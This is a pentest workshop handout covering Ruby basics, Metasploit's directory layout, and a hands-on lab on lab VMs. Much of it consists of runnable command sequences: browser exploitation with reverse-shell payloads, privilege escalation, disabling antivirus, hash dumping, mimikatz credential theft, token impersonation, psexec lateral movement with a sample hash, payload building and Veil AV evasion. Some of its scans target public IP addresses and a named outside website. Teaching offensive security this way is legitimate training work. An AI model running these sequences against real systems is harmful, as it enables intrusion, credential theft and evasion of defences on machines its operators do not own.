Metasploit Next Level


##########################
# Download the attack VM #
##########################
https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu14.zip
user: strategicsec
pass: strategicsec

https://s3.amazonaws.com/StrategicSec-VMs/Strategicsec-XP-ED-Attack-Host.zip
user: strategicsec
pass: strategicsec
 

###########################
# Download the victim VMs #
###########################
https://s3.amazonaws.com/StrategicSec-VMs/Windows7.zip
user: workshop
pass: password

https://s3.amazonaws.com/StrategicSec-VMs/XPSP3-ED-Target.zip

user: administrator
pass: strategicsec





############################################################
# Section 1: Ruby Fundamentals and Metasploit Architecture #
############################################################

################################
# Chapter 1: Ruby Fundamentals #
################################



- Ruby is a general-purpose, object-oriented programming language, which was created by Yukihiro Matsumoto, a computer 
scientist and programmer from Japan. It is a cross-platform dynamic language.

- The major implementations of this language are Ruby MRI, JRuby, HotRuby, IronRuby, MacRuby, etc. Ruby 
on Rails is a framework that is written in Ruby.

- Ruby's file name extensions are .rb and .rbw. 

- official website of this 

- language: www.ruby-lang.org.


- interactive Shell called Ruby Shell


- Installing and Running IRB


sudo apt-get install ruby2,2,2 ruby2,2,2-dev irb rdoc ri


- open up the interactive console and play around.


irb



- Math, Variables, Classes, Creating Objects and Inheritance


#following arithmetic operators:
Addition operator (+) — 10 + 23
Subtraction operator (-) — 1001 - 34
Multiplication operator (*) — 5 * 5
Division operator (/) — 12 / 2



#Now let’s cover some variable techniques. In Ruby, you can assign a value to a variable using the assignment 
operator. ‘=’ is the assignment operator. In the following example, 25 is assigned to x. Then x is incremented by 
30. Again, 69 is assigned to y, and then y is incremented by 33.

x = 25
x + 30
y = 69
y+33




- Let’s look at creating classes and creating objects. 

- Here, the name of the class is Strategicsec. An object has its properties and methods.



class Attack
attr_accessor :of, :sqli, :xss
end

#Now that we have created the classes let’s create the objects

first_attack = Attack.new
first_attack.of = "stack"
first_attack.sqli = "blind"
first_attack.xss = "dom"
puts first_attack.of
puts first_attack.sqli
puts first_attack.xss





- Let’s work on some inheritance that will help make your programming life easier. When we have multiple classes, 
inheritance becomes useful. In simple words, inheritance is the classification of classes. It is a process by which 
one object can access the properties/attributes of another object of a different class. Inheritance makes your 
programming life easier by maximizing code reuse.



class Exploitframeworks
attr_accessor :scanners, :exploits, :shellcode, :postmodules
end
class Metasploit < Exploitframeworks
end
class Canvas < Exploitframeworks
end
class Coreimpact < Exploitframeworks
end
class Saint < Exploitframeworks
end
class Exploitpack < Exploitframeworks
end



 

- Methods, More Objects, Arguments, String Functions and Expression Shortcuts

- Let’s create a simple method. A method is used to perform an action and is generally called with an object.

- Here, the name of the method is ‘learning’. This method is defined inside the Msfnl class. When it is called, 
it will print this string: “We are Learning how to PenTest”

- An object named ‘bo’ is created, which is used to call the method.


	
class Msfnl
def learning
puts “We are Learning how to PenTest”
end
end

#Now let’s define an object for our Method

joe = Msfnl.new
joe.learning




- An argument is a value or variable that is passed to the function while calling it. In the following example, while 
calling the puts() function, we are sending a string value to the function. This string value is used by the 
function to perform some particular operations.

puts (“Pentesting”)

 
- There are many useful string functions in Ruby. String functions make it easy to work with strings. Now, we will 
explain some useful string functions with an example.

- The length function calculates the length of a string. The upcase function converts a string to uppercase. And the 
reverse function reverses a string. The following example demonstrates how to use the string functions.

55.class
"I Love Programming".class
"I Love Pentesting".length
"Pown that box".upcase
"Love" + "To Root Boxes"
"evil".reverse
"evil".reverse.upcase

 

-  expressions and shortcuts. In the below example, ‘a’ is an operand, ‘3’ is an operand,  ‘=’ is 
an operator, and ‘a=3’ is the expression. A statement consists of one or multiple expressions. Following are the 
examples of some expressions.

a = 3
b = 6
a+b+20
d = 44
f = d
puts f




 

- shortcuts. +=, *= are the shortcuts. These operators are also called abbreviated 
assignment operators. Use the shortcuts to get the effect of two statements in just one. Consider the following 
statements to understand the shortcuts.

g = 70
g = g+44
g += 33

- In the above statement, g is incremented by 33 and then the total value is assigned to g.

g *= 3

- In the above statement, g is multiplied with 3 and then assigned to g.

- Example

- Comparison Operators, Loops, Data Types, and Constants

- Comparison operators are used for comparing one variable or constant with another variable or constant. We will show 
how to use the following comparison operators.
‘Less than’ operator (<): This operator is used to check whether a variable or constant is less than another 
variable or constant. If it’s less than the other, the ‘less than’ operator returns true.
‘Equal to’ operator (==): This operator is used to check whether a variable or constant is equal to another variable 
or constant. If it’s equal to the other, the ‘equal to’ operator returns true.
‘Not equal to’ operator (!=): This operator is used to check whether a variable or constant is not equal to another 
variable or constant. If it’s not equal to the other, the ‘not equal to’ operator returns true.


numberofports = 55
puts "number of ports found during scan" if numberofports < 300
numberofports = 400
puts "number of ports found during scan" if numberofports < 300
puts "number of ports found during scan" if numberofports == 300
puts "number of ports found during scan" if numberofports != 300
Example


- the ‘OR’ operator and the ‘unless’ keyword. This symbol ‘||’ represents the logical ‘OR’ operator. 

- This operator is generally used to combine multiple conditions.
- In case of two conditions, if both or any of the conditions is true, the ‘OR’operator returns true. Consider the 

- following example to understand how this operator works.

ports = 100
puts "number of ports found on the network" if ports<100 || ports>200
puts "number of ports found on the network" if ports<100 || ports>75
#unless
portsbelow1024 = 50
puts "If the ports are below 1024" unless portsbelow1024 < 1000
puts "If the ports are below 1024" unless portsbelow1024 < 1055
puts "If the ports are below 1024" unless portsbelow1024 < 20


- The ‘unless’ keyword is used to do something programmatically unless a condition is true.



- Loops are used to execute statement(s) repeatedly. Suppose you want to print a string 10 times.

- See the following example to understand how a string is printed 10 times on the screen using a loop.

10.times do puts "strategicsec" end
#Or use the curly braces
10.times {puts "strategicsec"}



- Changing Data Types: Data type conversion is an important concept in Ruby because it gives you flexibility while 
working with different data types. Data type conversion is also known as type casting.



- In the following example, a and b are integers. So when a is divided by b, an integer division is performed. As a 
result, 23/25 becomes 0.

- On the other hand, the integer variables c and d are converted to float. So the division gives the result in decimal 
points.

24/4
14.0/5.0
a = 23
b = 25
print a/b
c = 26
d = 33
print c.to_f/d.to_f




- Constants: Unlike variables, the values of constants remain fixed during the program interpretation. So if you 
change the value of a constant, you will see a warning message.




- Multiple Line String Variable, Interpolation, and Regular Expressions

- A multiple line string variable lets you assign the value to the string variable through multiple lines. 

strategicsec = <<mark
welcome
to the
best
metasploit
course
on the
market
mark
puts strategicsec



- Interpolation lets you evaluate any placeholder within a string, and the placeholder is replaced with the value that 
it represents. So whatever you write inside #{ } will be evaluated and the value will be replaced at that position. 
Examine the following example to understand how interpolation works in Ruby.



a = 4
b = 6
puts “a * b = a*b”
puts “ #{a} * #{b} = #{a*b} “
person = “Joe McCray”
puts “IT Security consultant person”
puts “IT Security consultant #{person}”

- Notice that the placeholders inside #{ } are evaluated and they are replaced with their values.


- Regular expression is a powerful technique for text searching and text manipulation. Ruby provides built-in support 
for regular expressions through the Regexp class. So the regular expressions in Ruby are the objects of Regexp type.



- In regular expressions, we define patterns to perform text search and advanced text manipulations. String literals 
and metacharacters constitute a pattern. // characters mark the beginning and end of a pattern in Ruby.
The following example shows how the substring “today”
is placed in the main string.

a = "Woot Woot, we are learning regular expressions!!"
puts a.sub(/^..../, 'Today')
puts a.sub(/^..../, 'Today')



- Let’s Loop the expressions. This example shows how to loop the expressions.

a.scan(/...../) {|w| puts w}
a.scan(/\S\S/) {|w| puts w}



- Character classes

strategicsec = "I Scanned 45 hosts and found 500 vulnerabilities"
"I love metasploit and what it has to offer!".scan(/[lma]/) {|y| puts y}
"I love metasploit and what it has to offer!".scan(/[a-m]/) {|y| puts y}



- Arrays, Push and Pop, and Hashes


- In the following example, numbers is an array that holds 6 integer numbers.



numbers = [2,4,6,8,10,100]
puts numbers[0]
puts numbers[4]
numbers[2] = 150
puts numbers




- Now we will show how you can implement a stack using an array in Ruby. A stack has two operations - push and pop. 



framework = []
framework << "modules"
framework << "exploits"
framework << "payloads"
framework.pop


- Hash is a collection of elements, which is like the associative array in other languages. Each element has a key 
that is used to access the element.


- Hash is a Ruby object that has its built-in methods. The methods make it easy to work with hashes.
In this example, 'metasploit' is a hash. 'exploits', 'microsoft', 'Linux' are the keys, and the following are the 
respective values: 'what module should you use', 'Windows XP' and 'SSH'.


metasploit = {'exploits' => 'what module should you use', 'microsoft' => 'Windows XP', 'Linux' => 'SSH'}
print metasploit.size
print metasploit["microsoft"]
metasploit['microsoft'] = 'redhat'
print metasploit['microsoft']



- Writing Ruby Scripts


- Let’s take a look at one of the ruby modules and see exactly now what it is doing. Now explain to me exactly what 
this program is doing. If we take a look at the ruby program what you find is that it is a TCP port scanner that 
someone made to look for a specific port. The port that it is looking for is port 21 FTP.

cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
ls
ack.rb  ftpbounce.rb  syn.rb  tcp.rb  xmas.rb

- Lets look at tcp.rb
  	


- Let’s take the time now to create and design our own port scanner what we will design here is a port scanner that 
will scan for port up to 0-1024. And we will add a function in there for the port scanner to prompt us stating OPEN 
port if it detects it. This is a pretty basic script, but it will help you in the event that you need to write 
something on the fly.



- PortScanner.rb :

require 'socket'
require 'timeout'

puts "Enter IP Address to Scan:"
ipaddress = gets

1.upto(1024) {|port|
  begin
    timeout(5) do
      TCPSocket.open(ipaddress.chop, port)
    end
    puts "Response/Port Open: #{port}"
  rescue Timeout::Error
    # uncomment the following line to show closed ports (noisy!)
    #puts "No Response /Port closed: #{port}"
  rescue
    # uncomment the following line to show closed ports (noisy!)
    #puts "No Response /Port closed: #{port}"
  end
}








######################################
# Chapter 2: Metasploit Fundamentals #
######################################

- Let’s take a little look at Metasploit Framework

- First, we should take note of the different directories, the Modular Architecture.

The modules that make up the Modular Architecture are
Exploits
Auxiliary
Payload
Encoder
Nops


Important directories to keep in mind for Metasploit, in case we'd like to edit different modules, or add our own, 

are

Modules
Scripts
Plugins
External
Data
Tools

- Let's take a look inside the Metasploit directory and see what's the

cd ~/toolz/metasploit
ls




- Now let's take a look inside the Modules directory and see what's there.

cd ~/toolz/metasploit/modules
ls


       
The auxiliary directory is where the things like our port-scanners will be, or any module that we can run that does 
not necessarily need to - have a shell or session started on a machine.

The exploits directory has our modules that we need to pop a shell on a box.
The external directory is where we can see all of the modules that use external libraries from tools Metasploit uses 
like Burp Suite
- Let’s take a look at the external directory

cd ~/toolz/metasploit/external
ls
 

- Our data directory holds helper modules for Metasploit to use with exploits or auxiliary modules.

cd ~/toolz/metasploit/data
ls
  

- For example, the wordlist directory holds files that have wordlists in them for brute-forcing logins or doing DNS 
brute-forcing

cd ~/toolz/metasploit/data/wordlists
ls
  	

- The Meterpreter directory inside of the data directory houses the DLLs used for the functionality of Meterpreter 
once a session is created.

cd ~/toolz/metasploit/data/meterpreter
ls


- In our case, the dll's are at

'~/.rvm/gems/ruby-2.1.5@metasploit-framework/gems/meterpreter_bins-0.0.13/meterpreter/'

ls ~/.rvm/gems/ruby-2.1.5@metasploit-framework/gems/meterpreter_bins-0.0.13/meterpreter/

- The scripts inside the scripts/Meterpreter directory are scripts that Meterpreter uses for post-exploitation, things 
like escalating privileges and dumping hashes.

These are being phased out, though, and post-exploitation modules are what is being more preferred.
The next important directory that we should get used to is the 'tools' directory. Inside the tools directory we'll 
find a bunch of different ruby scripts that help us on a pentest with things ranging from creating a pattern of code 
for creating exploits, to a pattern offset script to find where at in machine language that we need to put in our 
custom shellcode.

The final directory that we'll need to keep in mind is the plugins directory, which houses all the modules that have 
to do with other programs to make things like importing and exporting reports simple.
Now that we have a clear understanding of what all of the different directories house, we can take a closer look at 
the exploits directory and get a better understanding of how the directory structure is there, so if we make our own 
modules we're going to have a better understanding of where everything needs to go.

cd ~/toolz/metasploit/modules/exploits
ls



- The exploits directory is split up into several different directories, each one housing exploits for different types 
of systems. I.E. Windows, Unix, OSX, dialup and so on.
Likewise, if we were to go into the 'windows' directory, we're going to see that the exploits have been broken down 
into categories of different types of services/programs, so that you can pick out an exploit specifically for the 
service you're trying to exploit. Let's dig a little deeper into the auxiliary directory and see what all it holds 
for us.

cd ~/toolz/metasploit/modules/auxiliary/
ls
      


- And a little further into the directory, let's take a look at what's in the scanner directory

cd ~/toolz/metasploit/modules/auxiliary/scanner/
ls
  
- And one more folder deeper into the structure, let's take a look in the portscan folder

cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
ls
  	

- If we run 'cat tcp.rb' we'll find that this module is simply a TCP scanner that will find tcp ports that are open 
and report them back to us in a nice, easily readable format.

cat tcp.rb
  	


- Just keep in mind that all of the modules in the auxiliary directory are there for information gathering and for use 
once you have a session on a machine.
Taking a look at the payload directory, we can see all the available payloads, which are what run after an exploit 
succeeds.

cd ~/toolz/metasploit/modules/payloads/
ls
 	


- There are three different types of payloads: single, stagers, and staged. Each type of payload has a different 
application for it to be used as.
Single payloads do everything you need them to do at one single time, so they call a shell back to you and let you 
do everything once you have that shell calling back to you.
Stagers are required for limited payload space so that the victim machine will call back to your attack box to get 
the rest of the instructions on what it's supposed to do. The first stage of the payload doesn't require all that 
much space to just call back to the attacking machine to have the rest of the payload sent to it, mainly being used 
to download Stages payloads.


- Stages are downloaded by stagers and typically do complex tasks, like VNC sessions, Meterpreter sessions, or bind 
shells.

cd singles
cd windows
ls
 


- We can see several different payloads here that we can use on a windows system. Let's take a look at adduser.rb and 
see what it actually does.

cat adduser.rb

Which when looking at the code, we can see that it will add a new user called "Metasploit" to the machine and give 
the new user "Metasploit" a password of "Metasploit$1" Further down in the file we can actually see the command that 
it gives Windows to add the user to the system.


- Stagers just connect to victim machine back to yours to download the Stages payload, usually with a 

windows/shell/bind_tcp or windows/shell/reverse_tcp

cd ../../stagers
ls
  	


- Again, we can see that we have stagers for multiple systems and code types.

ls windows/
  	


As you can see, the stagers are mainly just to connect to the victim, to setup a bridge between us and the victim 
machine, so we can upload or download our stage payloads and execute commands.
Lastly, we can go to our stages directory to see what all payloads are available for us to send over for use with 
our stagers...

cd ../stages
ls
 	


Again, we can see that our stages are coded for particular operating systems and languages.
We can take a look at shell.rb and see the shellcode that would be put into the payload that would be staged on the 
victim machine which would be encoded to tell the victim machine where to connect back to and what commands to run, 
if any.

- Other module directories include nops, encoders, and post. Post modules are what are used in sessions that have 
already been opened in meterpreter, to gain more information on the victim machine, collect hashes, or even tokens, 
so we can impersonate other users on the system in hopes of elevating our privileges.

cd ../../../post/
ls
cd windows/
ls
  	


Inside the windows directory we can see all the post modules that can be run, capture is a directory that holds all 
the modules to load keyloggers, or grab input from the victim machine. Escalate has modules that will try to 
escalate our privileges. Gather has modules that will try to enumerate the host to get as much information as 
possible out of it. WLAN directory holds modules that can pull down WiFi access points that the victim has in 
memory/registry and give you the AP names as well as the WEP/WPA/WPA2 key for the network.

##################
# Day 1 Homework #
##################
Please take screenshots of you doing the first 10 videos in this playlist
https://www.youtube.com/playlist?list=PL1512BD72E7C9FFCA

###################################################
# Section 2: Actually Using Metasploit (For real) #
###################################################

sudo /sbin/iptables -F
 
cd ~/toolz/metasploit
 
./msfconsole

##############################################
# Run any Linux command inside of MSFConsole #
##############################################
ls
 
pwd
 
ping -c1 yahoo.com
 
nmap 192.168.153.163
 
nmap yahoo.com
 
 
 
-------------------------------
- You're on the outside scanning publicly accessable targets.
 
 
 
use auxiliary/scanner/portscan/tcp
 
set RHOSTS 54.69.156.253
 
set PORTS 80,1433,1521,3306,8000,8080,8081,10000                       
 
run
 
-------------------------------
use auxiliary/scanner/http/     (press the tab key, then press y to look through the http options)
 
 
- Here is an example:
use auxiliary/scanner/http/trace_axd
 
        - So let's do a quick google search for someone with trace.axd file
        - filetye:axd inurl:trace.axd
 
set RHOSTS 52.10.254.211
 
set VHOST endlessvacation.com
 
run
 
-------------------------------
 
 
use auxiliary/scanner/http/http_version                
 
set RHOSTS 54.69.156.253
 
set RPORT 8081
 
run
 
 
-------------------------------
 
use auxiliary/scanner/http/tomcat_enum                   
 
set RHOSTS 54.69.156.253
 
set RPORT 8081
 
run
 
 
 
-------------------------------
- In my opinion a much better option is a script called 'discover' from Lee Baird.
 
- You can get it here: https://github.com/leebaird/discover
 
- On the Ubuntu attack host you can run discover by typing the following:
cd ~/toolz/discover
sudo ./discover
 
 
- From here you can just follow the prompts. It will run both Nmap NSE scripts and Metasploit aux modules with all of the correct parameters for you.
 
 
##################################
# Basic Client-Side Exploitation #
##################################
 
echo j0e-r0x > /home/strategicsec/j0e-r0x.txt                   (You can of course replace j0e-r0x with yourname)
 
sudo /sbin/iptables -F
 
cd ~/toolz/metasploit
 
./msfconsole
 
use exploit/windows/browser/ie_cgenericelement_uaf
 
set ExitOnSession false
 
set URIPATH /ie8
 
set PAYLOAD windows/meterpreter/reverse_tcp
 
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
 
exploit -j
 
 
- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
- given to you by metasploit.
 
- The address will be something like:
 
http://192.168.153.164:8080/ie8                                            (Make sure you change this to your ubuntu ip address)
 
 
 
- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
 
 
###########################
# Client-Side Enumeration #
###########################
 
 
- You can list the active sessions by typing:
 
sessions -l
 
 
 
 
- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
 
 
sessions -i 1
 
 
 
 
 
- You should now see Metasploit's meterpreter prompt.
 
 
********************************** Figure out who and where you are **********************************
 
meterpreter> sysinfo
 
 
meterpreter> getuid
 
 
meterpreter> ipconfig
 
 
meterpreter> run post/windows/gather/checkvm
 
 
meterpreter> run get_local_subnets
 
 
 
********************************** Escalate privileges and get hashes **********************************
 
 
meterpreter> use priv
 
 
--Option 1: GetSystem
meterpreter> getsystem
 
--Option 2:
meterpreter > run post/windows/escalate/getsystem
 
--Option 3:
meterpreter> background
back
use post/windows/escalate/droplnk
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 1234
exploit
 
--Option 4:
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 12345
exploit
 
--Option 5:
use exploit/windows/local/service_permissions
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 5555
exploit
 
--Option 6:
use exploit/windows/local/trusted_service_path
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 4567
exploit
 
 
--Option 7:
use exploit/windows/local/ppr_flatten_rec
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7777
exploit
 
--Option 8:
use exploit/windows/local/ms_ndproxy
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7788
exploit
 
 
--Option 9:
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
--------------------------------------------------------
 
meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump
 
meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
 
meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
 
meterpreter> run post/windows/gather/credentials/credential_collector
 
 
********************************** Steal Tokens **********************************
 
meterpreter > getsystem
 
meterpreter > use incognito
 
meterpreter > list_tokens -u
 
meterpreter > list_tokens -g
 
meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
 
meterpreter> getuid
 
 
************ Stealing credentials and certificates ************
- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
 
meterpreter > getsystem
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
 
meterpreter > msv                                                               <-- Your AD password
 
meterpreter > livessp                                                           <-- Your Windows8 password
 
meterpreter > ssp                                                               <-- Your outlook password
 
meterpreter > tspkg                                                             <-- Your AD password
 
meterpreter > wdigest                                                           <-- Your AD password
 
meterpreter > mimikatz_command -f crypto::listStores
 
meterpreter > mimikatz_command -f crypto::listCertificates
 
meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
 
meterpreter > mimikatz_command -f crypto::patchcapi
 
meterpreter> search -d <directory> -f <file-pattern>
 
 
********************************** Enumerate the host you are on **********************************
 
meterpreter > run getcountermeasure
 
meterpreter> run winenum
 
meterpreter > run post/windows/gather/enum_applications
 
meterpreter > run post/windows/gather/enum_logged_on_users
 
meterpreter > run post/windows/gather/usb_history
 
meterpreter > run post/windows/gather/enum_shares
 
meterpreter > run post/windows/gather/enum_snmp
 
meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 
 
********************************** Prove access **********************************
 
meterpreter> upload /home/strategicsec/j0e-r0x.txt c:\\
 


********************************** Lateral Movement *******************************
 
 
Now we can run the PSEXEC exploit.
-- Option 1:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass password
 
set RHOST 192.168.153.163
 
set payload windows/meterpreter/reverse_tcp
 
set LHOST 192.168.153.164
 
set LPORT 2345
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST 192.168.153.163                      
 
set LHOST 192.168.153.164
 
set LPORT 5678
 
exploit


#####################
# Fix broken PSExec #
#####################
- We use the shell command to get to the Victim Dos command so we can add a registry field.
 
meterpreter > execute -c -H -f cmd -a "/k" -i
reg /?
 
 
- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
 
C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1



###########################################
# Chapter 3: Custom Meterpreter Scripting #
###########################################


- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit 

can offer.  This will also show you the flexibility of the Meterpreter scripts.
 
- We're going to start off with a simple Hello World script first.  
 
   
echo 'print_status("Hello World")' > /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
 
- Lets test out our helloworld.rb Meterpreter script.
 
 
meterpreter> run helloworld
 
 
- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
 
- Open /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb in your favorite and add following 

line.
vi /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
print_error("this is an error!")
print_line("this is a line")
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- Now that we have the basics down, we're going to do something a little more exciting.  
- The architecture to follow when creating these scripts goes as follows:
 
def getinfo(session)
        begin
        	<stuff goes here>
        rescue ::Exception => e
        	<stuff goes here>
        end
end


- Copy and paste the following code into our helloworld.rb script:
 
def getinfo(session)
    begin
       sysnfo = session.sys.config.sysinfo
       runpriv = session.sys.config.getuid
       print_status("Getting system information ...")
       print_status("The target machine OS is #{sysnfo['OS']}")
       print_status("The computer name is #{'Computer'} ")
       print_status("Script running as #{runpriv}")
    rescue ::Exception => e
      print_error("The following error was encountered #{e}")
   end
end
 
getinfo(client)
 
 
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- We can expand it by adding actual system commands to the script, lets look at how we can do this.
 
 
def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
commands = [ "set",
    "ipconfig  /all",
    "arp -a"]
 
list_exec(client,commands)
 
 
 
- Run the script:
 
meterpreter> run helloworld
  





################################################
# Chapter 4: Writing Meterpreter Resource Files #
################################################


- In this lab we are going to create a binary payload via msfpayload then craft a .rc file that automates the 
process to setup the multi handler listener.
 
- We will start off by creating the msfvenom

sudo /sbin/iptables -F
	strategicsec

cd ~/toolz/metasploit
 
./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.153.164 -f exe > /home/strategicsec/Desktop/meterpreter.exe
 
sudo chmod 777 /home/strategicsec/Desktop/meterpreter.exe
 
- In the syntax above, we set the payload, set the local host address to connect back too, then redirected the 
malicious payload to our desktop by issuing the correct path. We will also change the permissions on it to 777 just 
to make it easy for us to use WinSCP to copy it over to our Win7 machine.
 
- Next we are going to create a .rc (resource file) file that will automate the process for setting up a listener.
 
- Navigate to the /home/strategicsec/toolz/metasploit/ so that when you create the .rc file you can save it in the 
working directory.
 
 
- Type 'touch meterpreter.rc' to create the file.
touch meterpreter.rc
 
- Type 'echo use exploit/multi/handler  >> meterpreter.rc' to be appended to the .rc file.
echo use exploit/multi/handler  >> meterpreter.rc
 
- Type 'echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc' to be appended to the .rc file.
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc
 
- Type 'echo set LHOST 192.168.153.164>> meterpreter.rc' to be appended to the .rc file.
echo set LHOST 192.168.153.164>> meterpreter.rc
 
- Type 'echo exploit -j -z >> meterpreter.rc' to be appended to the .rc file.
echo exploit -j -z >> meterpreter.rc
 
- Then cat the meterpreter.rc out to verify that everything in the file looks ok.
cat meterpreter.rc
 
Now at the command prompt, type 'sudo ./msfconsole -r meterpreter.rc' to start the msfconsole module and call/run 

the 'meterpreter.rc' file.
./msfconsole -r meterpreter.rc
 
- Once the msfconsole starts, the meterpreter resource file is executed and the listener is automatically setup.  It is now listening for a connection!
 
- Now you must transfer the malicious meterpreter payload to the victim machine (you may do so by any means necessary, we have physical access so we transferred it via usb.
 
- Click on the payload and create the meterpreter session.
 
- Type 'sessions -l' to list your open sessions, and 'sessions -i 1' to indicate that you want to interact with 

meterpreter session under id 1.
 
exit -y
    	



***********************************
* Getting Serious About .rc files *
***********************************


touch /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run getcountermeasure >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run winenum >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_applications >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_logged_on_users >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/checkvm >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
 
- Ok, that was fun. Now let's take a quick look at the .rc file we just created.
cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
 
 
touch /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
 
echo use exploit/windows/browser/ie_cgenericelement_uaf >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set ExitOnSession true >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set URIPATH /ie8 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set PAYLOAD windows/meterpreter/reverse_tcp >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set LHOST 192.168.153.164 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc                            

            
 
echo set AutoRunScript multi_console_command -rc /home/strategicsec/toolz/metasploit/autorun-walk-through.rc >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo exploit -j -z >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
 
 
- Ok, that was more fun than the previous one. Now let's take a quick look at the .rc file we just created.
cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc

cat /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc 
 
- Alright, enough already. Let's run this thing.
./msfconsole -r old-faithful-ie8.rc





#################################
# Chapter 5: Anti-Virus Evasion #
#################################
------------------------------------------------------------
- Now it is time to work on some anti-virus evasion. Veil is the new tool on the scene for AV evasion.
sudo pip install PyInstaller
        strategicsec
 
cd /home/strategicsec/toolz/Veil-Evasion/setup
 
sudo ./setup.sh
        /home/strategicsec/toolz/metasploit/            (when it asks for the path to Metasploit)
 
cd /home/strategicsec/toolz/Veil-Evasion/
 
sudo python Veil-Evasion.py
 
update
 
clean
 
y
 
list
 
info 5
 
use 5
 
set LHOST 192.168.230.128
 
info
 
generate
 
        payload         (when it asks for a base name)
 
exit
 
sudo mv /usr/share/veil-output/compiled/payload.exe /home/strategicsec/            (my file path for payload.exe might be different)
 
sudo chmod 777 /home/strategicsec/payload.exe
 
cd ~/toolz/metasploit
 
./msfconsole  -r /usr/share/veil-output/handlers/payload_handler.rc
 
 
- From your Win7 host use WinSCP to copy test.exe from the Ubuntu host to your Win7 desktop.
- double click test.exe and see if you get a Meterpreter session
 
 
 
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.230.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
